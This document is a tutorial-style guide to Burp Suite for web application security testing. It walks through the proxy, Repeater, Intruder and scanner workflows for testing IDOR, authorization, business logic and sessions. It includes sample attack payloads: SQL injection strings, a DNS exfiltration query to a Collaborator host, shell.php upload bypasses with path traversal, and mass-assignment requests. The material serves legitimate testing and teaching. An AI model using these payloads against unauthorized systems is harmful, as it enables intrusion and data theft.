# Burp Suite

**Interactive HTTP(S) proxy and web application security testing toolkit**

## Purpose

Burp Suite is the industry-standard platform for manual web application security testing. From an Application Security perspective, Burp Suite enables:

1. **Precise vulnerability validation** — Confirm exploitability with manual proof-of-concept attacks
2. **Authorization testing** — Test access controls across user roles and privilege levels
3. **Logic flaw discovery** — Identify business logic vulnerabilities automated scanners miss
4. **Developer collaboration** — Generate reproducible PoCs with exact request/response evidence
5. **Remediation verification** — Validate fixes without full regression testing

**Critical distinction:** Burp Suite is a **manual testing platform**, not an automated scanner. While it includes scanning capabilities, its primary value is enabling skilled testers to find vulnerabilities that require understanding application logic, business context, and creative attack chains.

---

## Editions Compared

| Feature | Community (Free) | Professional | Enterprise |
|---------|-----------------|--------------|------------|
| **Proxy** | ✅ Full | ✅ Full | ✅ Full |
| **Repeater** | ✅ Full | ✅ Full | ✅ Full |
| **Intruder** | ⚠️ Rate-limited | ✅ Full speed | ✅ Full speed |
| **Scanner** | ❌ None | ✅ Active + Passive | ✅ Active + Passive |
| **Extensions** | ✅ BApp Store | ✅ BApp Store | ✅ BApp Store |
| **Collaborator** | ❌ None | ✅ Yes | ✅ Yes |
| **Save/Restore State** | ❌ No | ✅ Yes | ✅ Yes |

**Recommendation for AppSec:** Professional edition is essential for serious work. Community edition is usable for learning but rate-limited Intruder makes large-scale testing impractical.

---

## Setup and Configuration

### Initial Configuration
````
1. Launch Burp Suite
2. Create temporary project (or named project in Pro)
3. Use Burp defaults configuration
4. Start Burp
````

### Browser Proxy Configuration

**Manual proxy setup:**
````
Browser Settings → Network → Manual Proxy
HTTP Proxy: 127.0.0.1
Port: 8080
✅ Also use this proxy for HTTPS
````

**Recommended:** Use FoxyProxy extension for easy proxy toggling.

### SSL/TLS Certificate Installation

**Why this matters:** Without Burp's CA certificate, HTTPS sites show SSL warnings.

**Installation steps:**
1. Browse to `http://burpsuite` with proxy enabled
2. Click "CA Certificate" to download
3. Install in browser:
   - **Firefox:** Settings → Privacy & Security → Certificates → View Certificates → Import
   - **Chrome:** Settings → Privacy and Security → Security → Manage Certificates → Import

**Verify:** Browse to `https://example.com` — no SSL warning should appear.

---

## Core Components Deep Dive

### 1. Proxy — Traffic Interception and Modification

**Purpose:** Intercept, inspect, and modify HTTP(S) traffic in real-time.

#### Intercept Tab

**Turning interception on/off:**
````
Intercept is on:  Traffic pauses for manual review
Intercept is off: Traffic flows through automatically
````

**Common workflow:**
````
1. Enable intercept
2. Perform action in browser (e.g., login)
3. Request appears in Burp
4. Modify parameters
5. Click "Forward" to send modified request
6. Disable intercept for normal browsing
````

**Example — Bypassing Client-Side Validation:**
````http
Original request (client-side enforced):
POST /api/transfer HTTP/1.1
amount=100&to_account=12345

Modified in Burp (bypass validation):
POST /api/transfer HTTP/1.1
amount=999999&to_account=attacker_account
````

#### HTTP History

**Purpose:** Review all requests/responses that passed through proxy.

**Key features:**
- Filter by domain, status code, file extension, parameters
- Search request/response content
- Right-click → Send to Repeater/Intruder/Scanner

**Workflow — Finding API Endpoints:**
````
1. Browse application normally (intercept off)
2. Switch to HTTP history
3. Filter: Show only "in scope" items
4. Look for API calls: /api/*, /graphql, /v1/*
5. Send interesting requests to Repeater for testing
````

#### WebSockets History

**Purpose:** Capture and analyze WebSocket traffic (real-time chat, notifications, etc.).

**Testing WebSockets:**
````
1. Proxy → WebSockets history
2. Identify WebSocket connections
3. Right-click message → Send to Repeater
4. Modify WebSocket message
5. Test for injection, authorization bypass
````

---

### 2. Repeater — Manual Request Manipulation

**Purpose:** Manually modify and replay individual requests to test specific vulnerabilities.

#### Basic Usage
````
1. Find request in Proxy → HTTP history
2. Right-click → Send to Repeater
3. Modify request parameters
4. Click "Send"
5. Analyze response
6. Iterate and refine
````

#### IDOR Testing Workflow

**Scenario:** Test if users can access each other's data.
````http
Step 1: Authenticated as User A (ID: 123)
GET /api/profile?user_id=123 HTTP/1.1
Cookie: session=user_a_token

Response: 200 OK (User A's profile returned)

Step 2: Modify user_id to User B's ID
GET /api/profile?user_id=456 HTTP/1.1
Cookie: session=user_a_token

Response Analysis:
- 200 OK → IDOR vulnerability (unauthorized access)
- 403 Forbidden → Proper authorization
- 404 Not Found → May still be vulnerable (information disclosure)
````

**Evidence for report:**
````
Request:
GET /api/orders/789 HTTP/1.1
Host: target.com
Cookie: session=alice_session

Response:
{
  "order_id": 789,
  "customer_name": "Bob Smith",    ← Alice accessing Bob's order
  "total": 1234.56,
  "items": [...]
}
````

#### Authorization Testing Across Roles

**Scenario:** Test if regular users can access admin functionality.
````http
Step 1: Capture admin request
POST /api/admin/users/delete HTTP/1.1
Cookie: session=admin_token
{"user_id": 123}

Response: 200 OK (user deleted)

Step 2: Send to Repeater
Replace admin_token with regular_user_token

POST /api/admin/users/delete HTTP/1.1
Cookie: session=regular_user_token
{"user_id": 456}

Response Analysis:
- 200 OK → Privilege escalation vulnerability
- 403 Forbidden → Proper authorization
````

#### Parameter Tampering
````http
Original request:
POST /checkout HTTP/1.1
price=99.99&item_id=5&quantity=1

Tampered request:
POST /checkout HTTP/1.1
price=0.01&item_id=5&quantity=1

OR

POST /checkout HTTP/1.1
price=-99.99&item_id=5&quantity=1  ← Negative price (credit to account?)
````

#### Race Condition Testing

**Scenario:** Test if application handles concurrent requests properly.
````
1. Send request to Repeater
2. Duplicate tab multiple times (Ctrl+T in Repeater)
3. Create repeater group (right-click tabs)
4. Send all requests simultaneously
5. Check if race condition occurs (e.g., double spending, multiple coupon redemptions)
````

**Example — Coupon Code Race Condition:**
````http
Request (sent 10 times simultaneously):
POST /api/redeem-coupon HTTP/1.1
{"coupon": "SAVE50", "order_id": 123}

Expected: First request succeeds, others fail
Vulnerable: All 10 requests succeed (coupon applied 10 times)
````

---

### 3. Intruder — Automated Parameter Fuzzing

**Purpose:** Automate testing of multiple payloads against specific injection points.

#### Attack Types

| Attack Type | Use Case | Example |
|-------------|----------|---------|
| **Sniper** | Test single parameter with multiple payloads | Fuzz one parameter at a time |
| **Battering Ram** | Use same payload in all positions | Test if parameter order matters |
| **Pitchfork** | Pair payloads from multiple lists | Test username/password pairs |
| **Cluster Bomb** | Test all combinations of payloads | Brute-force credentials |

#### Workflow — Username Enumeration
````http
1. Capture login request
POST /login HTTP/1.1
username=test&password=test

2. Send to Intruder
3. Clear all payload positions
4. Highlight "test" in username field
5. Click "Add §" to mark as payload position
POST /login HTTP/1.1
username=§test§&password=wrongpass

6. Payloads tab → Load username wordlist
7. Start attack
8. Sort by response length/status code
9. Identify valid usernames by response differences
````

**Example results:**
````
Payload         Status  Length  Response
alice           200     1234    "Invalid password"     ← Valid user
bob             200     1234    "Invalid password"     ← Valid user
charlie         200     1180    "Invalid credentials"  ← Invalid user (different message)
````

#### IDOR Enumeration
````http
1. Capture request
GET /api/documents/1234 HTTP/1.1

2. Send to Intruder
3. Mark document ID as payload position
GET /api/documents/§1234§ HTTP/1.1

4. Payloads → Numbers (1-10000, step 1)
5. Start attack
6. Filter results by Status: 200
7. Extract accessible document IDs
````

**Results analysis:**
````
ID      Status  Length  Finding
1234    200     5678    Own document (expected)
1235    403     290     Forbidden (proper authorization)
1236    200     8901    Another user's document (IDOR!)
1237    403     290     Forbidden
1238    200     4567    Another user's document (IDOR!)
````

#### SQL Injection Detection
````http
1. Capture request with parameter
GET /search?q=test HTTP/1.1

2. Send to Intruder
3. Mark parameter as payload position
GET /search?q=§test§ HTTP/1.1

4. Payloads → Load SQL injection wordlist
5. Grep - Match → Add error patterns:
   - "SQL syntax error"
   - "mysql_fetch"
   - "ORA-01756"
   - "Microsoft OLE DB"
6. Start attack
7. Filter by "Error" column
````

**Positive result:**
````
Payload: test' OR '1'='1
Response contains: "You have an error in your SQL syntax"
→ SQL injection confirmed
````

#### Rate Limiting Testing
````http
1. Capture sensitive action (password reset, account creation)
2. Send to Intruder
3. No payload markers (testing same request repeatedly)
4. Payloads → Null payloads (generate 100 identical requests)
5. Resource Pool → Maximum concurrent requests: 10
6. Start attack
7. Analyze if all requests succeed (rate limiting failure)
````

---

### 4. Scanner — Automated Vulnerability Detection

**Note:** Professional edition only.

#### Scan Types

**Passive Scanning (default):**
- Analyzes traffic as it passes through proxy
- No additional requests sent
- Finds issues like missing security headers, sensitive data exposure

**Active Scanning:**
- Sends additional attack payloads
- More thorough but generates noise
- Tests for SQLi, XSS, command injection, etc.

#### Configuring Scans
````
1. Define target scope:
   Target → Scope → Add
   Include: https://target.com/*
   Exclude: https://target.com/logout

2. Configure scan settings:
   Scanner → Scan configuration → New
   - Enable relevant checks (SQLi, XSS, SSRF)
   - Disable low-value checks
   - Set scan speed (throttle for production)

3. Launch scan:
   Right-click request → Scan → Active scan
````

#### Interpreting Results

**Issue severity levels:**
- **High:** Immediately exploitable (SQLi, command injection, auth bypass)
- **Medium:** Potentially exploitable or information disclosure
- **Low:** Best practice violations, minimal security impact
- **Info:** Informational findings, no direct security risk

**Triage workflow:**
````
1. Sort by severity
2. Review High/Medium findings
3. Validate in Repeater (scanner can have false positives)
4. Document true positives with PoC
5. Ignore false positives (right-click → Report false positive)
````

---

### 5. Decoder — Encoding/Decoding Utilities

**Purpose:** Encode, decode, and hash data in various formats.

#### Common Use Cases

**Base64 decoding:**
````
Encoded cookie value:
eyJ1c2VyX2lkIjoxMjMsImFkbWluIjpmYWxzZX0=

Decode as Base64:
{"user_id":123,"admin":false}

Modify:
{"user_id":123,"admin":true}

Re-encode as Base64:
eyJ1c2VyX2lkIjoxMjMsImFkbWluIjp0cnVlfQ==
````

**URL encoding:**
````
Original: admin' OR '1'='1
URL encoded: admin%27+OR+%271%27%3D%271
````

**Hashing for password analysis:**
````
Hash: 5f4dcc3b5aa765d61d8327deb882cf99
Hash as MD5 → Compare against rainbow tables
Result: "password" (weak password detected)
````

---

### 6. Comparer — Response Comparison

**Purpose:** Compare two requests/responses to identify subtle differences.

#### IDOR Testing with Comparer
````
1. Send request as User A → Right-click → Send to Comparer
2. Send same request as User B → Send to Comparer
3. Comparer → Compare responses
4. Highlight differences (User A sees data User B shouldn't)
````

**Example — Comparing 403 vs 401:**
````
Request 1 (no auth): HTTP 401 Unauthorized
Request 2 (invalid auth): HTTP 403 Forbidden

Difference: Application reveals valid vs invalid credentials
→ User enumeration vulnerability
````

---

### 7. Sequencer — Randomness Testing

**Purpose:** Test quality of session tokens, CSRF tokens, password reset tokens.

#### Testing Session Token Randomness
````
1. Capture login request
2. Send to Intruder
3. Configure to send same request 100 times
4. Extract session tokens from responses
5. Send to Sequencer
6. Analyze entropy

Results:
- High entropy: Secure tokens
- Low entropy: Predictable tokens (session hijacking risk)
````

**Weak token example:**
````
Token 1: session_12345678
Token 2: session_12345679
Token 3: session_12345680
→ Sequential tokens (easily guessable)
````

---

### 8. Extensions — Extending Burp Capabilities

**Essential Extensions (BApp Store):**

| Extension | Purpose | Use Case |
|-----------|---------|----------|
| **Autorize** | Automated authorization testing | Test every request with different user roles |
| **Logger++** | Enhanced logging | Advanced filtering and searching |
| **Turbo Intruder** | High-speed fuzzing | Race conditions, rate limit testing |
| **ActiveScan++** | Additional scan checks | Expanded vulnerability coverage |
| **Param Miner** | Find hidden parameters | Discover undocumented API parameters |
| **JWT Editor** | JSON Web Token manipulation | Test JWT authentication/authorization |
| **Upload Scanner** | File upload testing | Detect unrestricted file upload |
| **Retire.js** | JavaScript library scanner | Find vulnerable JS libraries |
| **Collaborator Everywhere** | SSRF/XXE detection | Out-of-band vulnerability detection |

#### Installing Extensions
````
1. Extender → BApp Store
2. Search for extension
3. Click "Install"
4. Extension appears in main tab bar
````

---

## AppSec Testing Workflows

### Workflow 1: Complete IDOR Testing

**Objective:** Test if users can access objects owned by other users.
````
Step 1: Map all object access patterns
- Browse application as authenticated user
- Identify requests with object IDs (orders, documents, profiles)
- Note ID format (numeric, UUID, hash)

Step 2: Test individual IDOR
- Send request to Repeater
- Modify object ID to another user's ID
- Check response (200 = vulnerable, 403 = secure)

Step 3: Automated enumeration (if vulnerable)
- Send to Intruder
- Mark ID as payload position
- Load numeric/UUID wordlist
- Extract accessible IDs

Step 4: Test across HTTP methods
- GET /api/order/123 → Can read
- PUT /api/order/123 → Can update?
- DELETE /api/order/123 → Can delete?

Step 5: Test indirect object references
- Direct: /api/user/123
- Indirect: /api/user/profile (session determines user)
- Test if session can be manipulated
````

**Evidence collection:**
````http
Request as Alice (user_id=123):
GET /api/documents/456 HTTP/1.1
Cookie: session=alice_token

Response:
{
  "doc_id": 456,
  "owner": "Bob",        ← Alice accessing Bob's document
  "content": "Confidential merger details...",
  "created": "2024-12-01"
}

Business Impact:
- 190,000 user documents accessible
- Violates GDPR Article 32 (data protection)
- PCI-DSS Requirement 7.1 violation (access controls)
````

---

### Workflow 2: Multi-Role Authorization Testing

**Objective:** Verify role-based access controls work correctly.

**Setup:**
````
Create test accounts:
- Admin (full access)
- Manager (partial access)
- User (minimal access)
````

**Testing process:**
````
Step 1: Map admin functionality
- Login as admin
- Identify admin-only endpoints:
  /admin/users/create
  /admin/reports/financial
  /admin/settings/security

Step 2: Test with lower privilege roles
For each admin endpoint:
  a) Send request to Repeater
  b) Replace admin session with manager session
  c) Check if request succeeds (privilege escalation)
  d) Replace with user session
  e) Document findings

Step 3: Test parameter-based authorization
- Admin request: /users?role=admin
- Test with manager: /users?role=admin (should fail)
- Test parameter tampering: /users?role=manager&admin=true
````

**Matrix testing approach:**

| Endpoint | Admin | Manager | User | Finding |
|----------|-------|---------|------|---------|
| GET /users | ✅ 200 | ✅ 200 | ✅ 200 | OK (public endpoint) |
| POST /users/create | ✅ 200 | ❌ 403 | ❌ 403 | OK (proper restriction) |
| DELETE /users/123 | ✅ 200 | ✅ 200 | ❌ 403 | ⚠️ VULN (manager shouldn't delete) |
| GET /admin/reports | ✅ 200 | ⚠️ 200 | ❌ 403 | ⚠️ VULN (manager has admin access) |

---

### Workflow 3: Business Logic Flaw Testing

**Common logic flaws to test:**

#### 1. Price Manipulation
````http
Original request:
POST /checkout HTTP/1.1
{
  "item_id": 5,
  "quantity": 1,
  "price": 99.99,
  "total": 99.99
}

Tests to perform:
1. Negative quantity: "quantity": -1 (refund instead of purchase?)
2. Negative price: "price": -10.00 (get paid to buy?)
3. Zero price: "price": 0.00
4. Fractional quantity: "quantity": 0.001 (bypass minimum order?)
5. Remove price field entirely (server calculates?)
````

#### 2. Workflow Bypass
````
Normal flow:
1. Add to cart → 2. Enter shipping → 3. Enter payment → 4. Confirm order

Test: Can we skip steps?
1. Add to cart → Directly POST /order/confirm
2. Does payment get validated?
3. Does order complete without payment?
````

**Burp workflow:**
````
1. Complete normal checkout (capture all requests)
2. Send final "confirm order" request to Repeater
3. Remove payment token parameter
4. Send request
5. Check if order processes without payment
````

#### 3. Rate Limit Bypass
````http
Coupon redemption endpoint:
POST /api/coupon/apply HTTP/1.1
{"coupon_code": "SAVE50", "order_id": 123}

Tests:
1. Send request 10 times (should fail after first use)
2. Test race condition (send 10 requests simultaneously)
3. Test parameter variations:
   - coupon_code vs couponCode vs coupon-code
4. Test different HTTP methods:
   - POST /api/coupon/apply
   - GET /api/coupon/apply?code=SAVE50
````

#### 4. State Manipulation
````
Multi-step process (e.g., account creation):
1. Email verification (sends code)
2. Code validation
3. Account activation

Test: Can we skip verification?
1. Capture "activate account" request (step 3)
2. Send directly without completing steps 1-2
3. Modify verification token to predictable value
4. Test if account activates without verification
````

---

### Workflow 4: Session Management Testing

**Session fixation:**
````http
Step 1: Get session ID before authentication
GET / HTTP/1.1
Response: Set-Cookie: PHPSESSID=abc123

Step 2: Login with this session ID
POST /login HTTP/1.1
Cookie: PHPSESSID=abc123

Step 3: Check if session ID changes after login
Response: Set-Cookie: PHPSESSID=abc123  ← VULNERABLE (session not regenerated)

Attack: Attacker sets victim's session ID, waits for login, hijacks session
````

**Session timeout:**
````
1. Login and capture session token
2. Wait 30 minutes (or configured timeout)
3. Replay authenticated request in Repeater
4. Check if session is still valid
5. Expected: 401 Unauthorized
6. Vulnerable: 200 OK (no session timeout)
````

**Session logout:**
````http
Step 1: Login and note session token
Cookie: session=xyz789

Step 2: Logout
POST /logout HTTP/1.1
Cookie: session=xyz789

Step 3: Replay authenticated request
GET /profile HTTP/1.1
Cookie: session=xyz789

Expected: 401 Unauthorized (session invalidated)
Vulnerable: 200 OK (logout didn't invalidate session)
````

---

### Workflow 5: API Security Testing

**GraphQL testing:**
````graphql
1. Identify GraphQL endpoint
POST /graphql HTTP/1.1

2. Send introspection query
{__schema{types{name,fields{name,type{name}}}}}

3. Analyze exposed types and fields
4. Test for authorization on sensitive queries
5. Test for injection in parameters
````

**REST API testing:**
````http
1. Enumerate endpoints (Proxy → HTTP history)
   GET /api/v1/users
   POST /api/v1/users
   GET /api/v1/users/123
   PUT /api/v1/users/123
   DELETE /api/v1/users/123

2. Test each HTTP method on each endpoint
   - Does GET /users require auth?
   - Can POST /users create admin users?
   - Can DELETE without ownership check?

3. Test mass assignment
POST /api/v1/users HTTP/1.1
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin"     ← Injected parameter
}
````

---

### Workflow 6: File Upload Testing

**Bypass file type restrictions:**
````
1. Upload legitimate image, capture request in Burp
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

[JPEG data]

2. Send to Repeater, modify:
   - filename="shell.php"
   - filename="shell.php.jpg"
   - filename="shell.jpg.php"
   - Content-Type: image/jpeg (but actual content is PHP)

3. Test double extensions, null bytes, path traversal:
   - filename="shell.php%00.jpg"
   - filename="../../../var/www/shell.php"
````

---

## Advanced Techniques

### Burp Collaborator — Out-of-Band Testing

**Purpose:** Detect SSRF, XXE, blind injection vulnerabilities.

**How it works:**
1. Burp generates unique subdomain: `abc123.burpcollaborator.net`
2. Inject payload referencing this domain
3. Monitor for DNS/HTTP requests to Collaborator server
4. Confirms vulnerability even without direct response

**SSRF detection:**
````http
POST /api/fetch-url HTTP/1.1
{"url": "http://abc123.burpcollaborator.net"}

Collaborator receives:
- DNS lookup for abc123.burpcollaborator.net
- HTTP request to http://abc123.burpcollaborator.net
→ SSRF confirmed (server made outbound request)
````

**Blind SQL injection:**
````http
GET /search?q=test' AND (SELECT SLEEP(5) FROM users WHERE user='admin')-- HTTP/1.1

No direct response, but use Collaborator:
GET /search?q=test' AND (SELECT LOAD_FILE(CONCAT('\\\\',password,'.abc123.burpcollaborator.net')))-- HTTP/1.1

Collaborator receives DNS query:
secretpass123.abc123.burpcollaborator.net
→ Data exfiltrated via DNS
````

---

### Match and Replace Rules

**Purpose:** Automatically modify requests/responses.

**Use cases:**

**Remove security headers:**
````
Match: ^Strict-Transport-Security:.*$
Replace: [empty]
Type: Response header
→ Test if application relies on HSTS for security
````

**Add authentication automatically:**
````
Match: ^$
Replace: Authorization: Bearer test_token
Type: Request header
→ Test all endpoints with authentication without manual addition
````

**Bypass CSRF protection:**
````
Match: ^CSRF-Token:.*$
Replace: CSRF-Token: bypassed
Type: Request header
→ Test if CSRF validation is properly implemented
````

---

### Scope Management

**Why scope matters:**
- Prevents testing out-of-scope domains
- Reduces noise in HTTP history
- Focuses scanner on authorized targets

**Configuring scope:**
````
Target → Scope → Include in scope
Protocol: https
Host: target.com
File: ^/api/.*$  (regex for API endpoints only)

Target → Scope → Exclude from scope
Protocol: https
Host: target.com
File: ^/logout$  (prevent accidental logout)
````

**Filter by scope:**
````
Proxy → HTTP history → Filter
☑ Show only in-scope items
````

---

## Integration with Other Tools

### Burp → SQLMap
````bash
# Export request from Burp
Right-click request → Save item

# Test with SQLMap
sqlmap -r request.txt --batch --level=5 --risk=3
````

### Burp → ffuf
````bash
# Extract discovered endpoints from Burp
Proxy → HTTP history → Filter
Select interesting endpoints
Right-click → Copy URLs

# Fuzz parameters with ffuf
ffuf -u "http://target.com/api/endpoint?FUZZ=value" -w params.txt
````

### Burp → Custom Scripts

**Python example using Burp's API:**
````python
from burp import IBurpExtender
from burp import IHttpListener

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        callbacks.setExtensionName("Custom Auth Tester")
        callbacks.registerHttpListener(self)
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            # Modify every request to test different auth tokens
            request = messageInfo.getRequest()
            # ... manipulation logic ...
````

---

## Reporting and Documentation

### Generating Evidence for Reports

**Best practices:**
````
1. Capture vulnerable request in Repeater
2. Show normal behavior (proper authorization)
3. Show exploitation (unauthorized access)
4. Screenshot both request/response pairs
5. Annotate differences (highlight user ID change)
6. Document business impact
````

**Example report section:**
````markdown
## IDOR Vulnerability — User Profile Access

**Severity:** High (CVSS 8.1)

**Affected Endpoint:** `GET /api/users/{id}`

**Vulnerability Description:**
The application does not verify that the requesting user has permission to access the requested user profile. Any authenticated user can view any other user's profile by changing the `id` parameter.

**Proof of Concept:**

Request as User A (ID: 123):
```http
GET /api/users/456 HTTP/1.1
Host: target.com
Cookie: session=user_a_token

HTTP/1.1 200 OK
{
  "user_id": 456,
  "name": "Bob Smith",
  "email": "bob@company.com",
  "ssn": "123-45-6789",
  "salary": 85000
}
```

**Business Impact:**
- 190,000 user records accessible without authorization
- Exposure of PII (SSN, salary, personal contact information)
- GDPR Article 32 violation (inadequate access controls)
- PCI-DSS Requirement 7.1 violation (restrict access by job function)

**Remediation:**
```php
// Vulnerable code:
$user = User::find($request->input('id'));

// Secure fix:
$user = User::find($request->input('id'));
if ($user->id !== auth()->id()) {
    abort(403, 'Unauthorized');
}
```

**Verification:**
After remediation, request returns 403 Forbidden when attempting to access another user's profile.
````

---

## Best Practices

### Do's ✅

- **Save project state** — Regular backups of Burp state for large assessments
- **Use scope intelligently** — Prevent accidental out-of-scope testing
- **Document as you test** — Add comments to requests in Burp for later reference
- **Test systematically** — Work through application methodically, not randomly
- **Verify manually** — Don't trust scanner results without validation in Repeater
- **Coordinate with developers** — Share findings with reproducible PoCs from Repeater

### Don'ts ❌

- **Don't scan production** — Without explicit authorization and coordination
- **Don't ignore rate limits** — Intruder can overwhelm applications
- **Don't trust automated findings** — Scanner has false positives, verify everything
- **Don't test logout repeatedly** — Annoying for monitoring teams
- **Don't modify destructive actions** — DELETE requests, payment transactions (use test accounts)

---

## Performance and Troubleshooting

### Burp Running Slowly
````
User options → Performance
- Increase memory: --Xmx4g (4GB)
- Reduce history limit: Store last 100 items
- Disable unnecessary extensions
- Pause passive scanning during active testing
````

### SSL/TLS Errors
````
1. Check CA certificate installed in browser
2. Regenerate CA certificate:
   Proxy → Options → Proxy Listeners → Import/Export CA certificate → Regenerate
3. Reinstall in browser
````

### Request Not Appearing in History
````
1. Check scope filter (may be filtering request)
2. Disable "Show only in-scope items"
3. Check if interception is paused
4. Verify proxy settings in browser
````

---

## Interview Talking Points

**If asked about Burp Suite in an interview:**

> "Burp Suite is my primary tool for manual application security testing. I use it for authorization testing, IDOR discovery, and validating business logic flaws that automated scanners miss. For example, I recently found an IDOR vulnerability by using Repeater to test if users could access each other's orders by changing the order ID parameter. The scanner didn't flag it because both responses returned 200, but the actual order contents were different. I also use Intruder for systematic testing—like enumerating all accessible document IDs to determine the scope of an IDOR vulnerability. The key is combining Burp's tools: Proxy for discovery, Repeater for validation, Intruder for scale, and Comparer for subtle differences in responses."

**Follow-up: "How do you use Burp for multi-role testing?"**

> "I create test accounts for each role—admin, manager, and regular user. Then I map all admin functionality by browsing as admin with Burp's proxy running. I capture every admin request, send it to Repeater, and replay it with lower-privilege session tokens. I look for three failure modes: no authorization check at all (request succeeds), partial authorization (some data leaked in error message), or indirect access (parameter tampering to elevate privileges). I document findings in a matrix showing which roles can access which endpoints. This systematic approach ensures I test all privilege boundaries, not just obvious ones."

**Follow-up: "What's your workflow for testing a new application?"**

> "I start with passive reconnaissance—browse the entire application with Burp's proxy running, intercept off, just observing traffic. I identify authentication mechanisms, API endpoints, object reference patterns, and interesting parameters. Then I test methodically: authentication/session management first, then authorization across roles, then business logic, then injection vulnerabilities. I use Burp's site map to track coverage. For each finding, I validate in Repeater with a proper proof-of-concept before reporting. I document everything with requests/responses from Burp so developers can reproduce exactly what I did. The goal is precision and reproducibility, not just throwing automated scan results over the wall."

---

## Quick Reference

### Essential Shortcuts

| Shortcut | Action |
|----------|--------|
| `Ctrl+R` | Send to Repeater |
| `Ctrl+I` | Send to Intruder |
| `Ctrl+Shift+B` | Send to Burp Scanner |
| `Ctrl+Space` | Toggle interception |
| `Ctrl+F` | Find in requests/responses |
| `Ctrl+T` | New Repeater tab |

### Common Request Modifications
````http
# Test IDOR
Original: GET /api/user/123
Test:     GET /api/user/456

# Test privilege escalation
Original: Cookie: session=user_token
Test:     Cookie: session=admin_token

# Test parameter tampering
Original: POST /checkout {"price": 99.99}
Test:     POST /checkout {"price": 0.01}

# Test mass assignment
Original: POST /users {"name": "test"}
Test:     POST /users {"name": "test", "role": "admin"}

# Test authentication bypass
Original: GET /admin (401 Unauthorized)
Test:     GET /admin HTTP/1.1
          X-Original-URL: /public
````

---

## Additional Resources

- **Official Documentation:** https://portswigger.net/burp/documentation
- **Web Security Academy:** https://portswigger.net/web-security (Free training by PortSwigger)
- **Burp Extensions:** https://portswigger.net/bappstore
- **PortSwigger Blog:** https://portswigger.net/research (Advanced techniques)

---

## Testing Checklist

### Before Testing
- [ ] Scope defined and configured in Burp
- [ ] Test accounts created (multiple roles)
- [ ] Proxy and SSL certificate configured
- [ ] Authorization obtained
- [ ] Baseline normal behavior documented

### During Testing
- [ ] Test authentication/session management
- [ ] Test authorization across all roles
- [ ] Test for IDOR on all object references
- [ ] Test business logic workflows
- [ ] Test parameter tampering (price, quantity, IDs)
- [ ] Test rate limiting on sensitive actions
- [ ] Test file upload restrictions
- [ ] Test API endpoints and GraphQL
- [ ] Document findings with PoCs in Repeater

### After Testing
- [ ] Validate all findings manually
- [ ] Screenshot evidence from Repeater
- [ ] Document business impact
- [ ] Provide remediation code examples
- [ ] Save Burp project state
- [ ] Generate report with reproducible steps